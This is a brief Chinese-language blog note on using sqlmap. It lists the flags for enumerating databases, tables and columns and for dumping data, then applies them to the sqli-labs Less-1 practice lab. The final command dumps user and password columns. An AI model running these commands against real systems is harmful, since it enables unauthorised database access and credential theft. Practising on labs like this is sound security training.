---
title: sqlmap使用
date: 2021-01-16 19:24:32
tags: [安全,sql注入]
---

-u 检测存在可利用漏洞

--dbs 获取所有库

--current-db 列出当前数据库

-D 库名 --tables 查询此库中存在的表

-D 库名 -T 表名 --columns 列出表中的所有列

-D 库名 -T 表名 -C 列名1,列名2 --dump 导出列中的所有数据

### sqlilabs_Less-1

`python E:\sqlmap\sqlmap.py -u "url"`

`python E:\sqlmap\sqlmap.py -u "url" --dbs`

`python E:\sqlmap\sqlmap.py -u "url" --current-db`

`python E:\sqlmap\sqlmap.py -u "url" -D security --tables`

python E:\sqlmap\sqlmap.py -u "url" -D security -T users --columns

`python E:\sqlmap\sqlmap.py -u "url" -D security -T users -C id,user,password --dump`

